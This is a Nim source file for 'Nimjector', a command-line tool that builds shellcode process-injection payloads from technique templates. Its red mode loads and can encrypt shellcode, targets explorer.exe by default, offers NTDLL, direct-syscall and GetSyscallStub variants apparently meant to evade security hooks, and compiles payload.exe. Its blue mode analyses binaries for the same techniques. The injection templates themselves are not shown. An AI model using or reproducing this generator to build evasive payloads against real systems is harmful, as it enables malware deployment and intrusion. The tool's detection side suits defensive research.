import docopt, os, base64
include utils/utils

let doc = """
Nimjector v 1.0

Usage:
  nimjector list -t <technique_name> [-c call]
  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-e] [-n | -s | -g]
  nimjector blue -f binary
  nimjector (-h | --help)
  nimjector --version

Options:
  -h --help     		Show this screen.
  --version     		Show version.
  -i --image shellcode.bin	File to load
  -f --file binary		Binary to analyze
  -t --technique technique_name Name of technique (For list: use "all" to print all available techniques)
  -c --call  			Print specific API call (For list: use "all" to print all available calls)
  -P --print  			Print the template instead of writing into a file
  -p --process 			Target process to be spawned or injected
  -e --encrypt    		Encrypts the shellcode 
  -n --nt  			Use NTDLL calls instead of Kernel32
  -s --syscalls  		Use Syscalls via NimlineWhisphers2
  -g --gstub   			Use GetSyscallStub
"""

var template_output: string = "payload.nim"

let args = docopt(doc, version = "Nimjector 1.0")
let technique_list = get_techniques("models/techniques.yml")
let all_techniques = get_all_techniques(technique_list)

# For listing techniques or calls
if args["list"]:
  let technique = $args["--technique"]
  let call = $args["--call"]

  if contains(all_techniques, technique) or technique == "all":
    let calls = get_calls(technique_list, technique)
    if technique == "all":
      colored_print(fmt"[+] Available techniques - {intToStr(all_techniques.len)}", fgGreen)
      for i in all_techniques:
        colored_print(fmt"[-] {i}", fgGreen)
    else:
      if contains(calls, call) or call == "all" or call == "false":
        colored_print(fmt"[+] Technique: {technique}", fgGreen)
        colored_print(fmt"[-] Calls:", fgGreen)
        for i in calls:
          var split_call = i.split(" - ")[0]
          colored_print(fmt"[-] {split_call}", fgGreen)

      else:
        colored_print(fmt"[-] API Call not found - {call}", fgRed)

  else:
    colored_print(fmt"[-] Technique not found - {technique}", fgRed)
  
# For payload creation
if args["red"]:
  let shellcode_file = $args["--image"]
  let shellcode_type = $args["--encrypt"]
  let technique = $args["--technique"]

  # For spawning remote processes
  var process = $args["--process"]
  if process == "nil":
     process = "explorer.exe"

  # Load shellcode 
  let shellcode = readFile(shellcode_file)

  # API call variations
  var variation = "kernel32"   
  if args["--nt"]:
    variation = "ntdll"
  if args["--syscalls"]:
    variation = "syscalls"
  if args["--gstub"]:
    variation = "gstub"

  var modules = get_modules(technique, variation, shellcode_type)
  var setup = get_init_setup(technique, technique_list, variation)
  var shellcode_template = get_shellcode_template(shellcode_type, encode(shellcode))

  var payload = build_template(technique, technique_list, variation)
  payload = payload.replace("REPLACE_MODULES", modules)
  payload = payload.replace("REPLACE_INIT_SETUP", setup)
  payload = payload.replace("REPLACE_SC_TEMPLATE", shellcode_template)
  payload = payload.replace("REPLACE_PROCESS", process)
  
  if args["--print"]:
    echo payload

  else:
    writeFile(template_output, payload)
    colored_print("[+] Payload written to payload.nim", fgGreen)

    colored_print(fmt"[+] Compiling payload.nim - {variation} variation", fgGreen)
    let res = os.execShellCmd("nim c payload.nim")
    if res == 0:
      colored_print("[+] Successfully compiled payload.exe", fgGreen)
    else:
      colored_print("[!] Failed to compile payload.exe", fgRed)
  
# For detection    
if args["blue"]:
  let bin = $args["--file"]
  process_binary(bin, technique_list)
